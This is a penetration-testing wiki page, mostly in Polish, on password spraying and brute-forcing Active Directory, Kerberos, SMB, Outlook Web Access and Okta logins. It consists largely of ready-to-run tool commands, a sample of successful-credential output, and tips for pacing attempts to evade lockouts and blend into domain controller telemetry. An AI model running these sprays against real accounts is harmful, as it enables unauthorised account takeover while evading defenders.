# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Gdy znajdziesz kilka **valid usernames**, możesz spróbować najczęstszych **common passwords** (pamiętaj o password policy środowiska) dla każdego z odkrytych użytkowników.\
By **default** the **minimum** **password** **length** is **7**.

Listy common usernames mogą również być przydatne: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Zauważ, że możesz **could lockout some accounts if you try several wrong passwords** (by default more than 10).

### Get password policy

Jeśli masz jakieś user credentials lub shell jako domain user możesz **get the password policy with**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Eksploatacja z Linuxa (lub dowolnego systemu)

- Używając **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Korzystanie z [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(możesz określić liczbę prób, aby uniknąć zablokowań):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Używanie [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NIEZALECANE, CZASAMI NIE DZIAŁA
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- Za pomocą modułu `scanner/smb/smb_login` w **Metasploit**:

![](<../../images/image (745).png>)

- Przy użyciu **rpcclient**:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Z systemu Windows

- Z [Rubeus](https://github.com/Zer1t0/Rubeus) w wersji z modułem brute:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- With [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Może domyślnie generować użytkowników z domeny oraz pobierać politykę haseł z domeny i ograniczać liczbę prób zgodnie z nią):
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- Z [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying z targetowaniem LDAP i PSO-aware throttling (SpearSpray)

Kerberos pre-auth–based spraying zmniejsza hałas w porównaniu z próbami bind SMB/NTLM/LDAP i lepiej współgra z politykami blokady AD. SpearSpray łączy targetowanie oparte na LDAP, silnik wzorców oraz świadomość polityk (polityka domeny + PSOs + bufor badPwdCount), aby przeprowadzać spraying precyzyjnie i bezpiecznie. Może też oznaczać przejęte principal'e w Neo4j dla ścieżek w BloodHound.

Kluczowe idee:
- Odkrywanie użytkowników przez LDAP z paginacją i obsługą LDAPS, opcjonalnie przy użyciu niestandardowych filtrów LDAP.
- Polityka blokady domeny + filtrowanie uwzględniające PSO, które pozostawia konfigurowalny bufor prób (threshold) i zapobiega blokowaniu użytkowników.
- Weryfikacja Kerberos pre-auth przy użyciu szybkich powiązań gssapi (generuje 4768/4771 na DCs zamiast 4625).
- Generowanie haseł oparte na wzorcach, dla każdego użytkownika, z użyciem zmiennych takich jak imiona oraz wartości czasowe wyprowadzone z pwdLastSet każdego użytkownika.
- Kontrola przepustowości za pomocą wątków, jittera i maksymalnej liczby żądań na sekundę.
- Opcjonalna integracja z Neo4j do oznaczania przejętych użytkowników dla BloodHound.

Podstawowe użycie i odkrywanie:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Celowanie i kontrola wzorców:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Stealth i kontrole bezpieczeństwa:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Wzbogacanie Neo4j/BloodHound:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Przegląd systemu wzorców (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Dostępne zmienne obejmują:
- {name}, {samaccountname}
- Temporal from each user’s pwdLastSet (or whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Composition helpers and org token: {separator}, {suffix}, {extra}

Uwagi operacyjne:
- Preferuj zapytania do PDC-emulator przy użyciu -dc, aby odczytać najbardziej autorytatywny badPwdCount i informacje związane z polityką.
- Resety badPwdCount są wyzwalane przy następnym podejściu po oknie obserwacji; używaj progów i timingów, aby pozostać bezpiecznym.
- Kerberos pre-auth attempts pojawiają się jako 4768/4771 w telemetrii DC; używaj jitter i rate-limiting, aby wtopić się w tło.

> Tip: SpearSpray’s default LDAP page size is 200; adjust with -lps as needed.

## Outlook Web Access

Istnieje wiele narzędzi do p**assword spraying outlook**.

- Za pomocą [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- Za pomocą [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- Za pomocą [Ruler](https://github.com/sensepost/ruler) (niezawodne!)
- Za pomocą [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- Za pomocą [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Aby użyć któregokolwiek z tych narzędzi, potrzebujesz listy użytkowników oraz hasła / małej listy haseł do password spraying.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## Źródła

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)


{{#include ../../banners/hacktricks-training.md}}
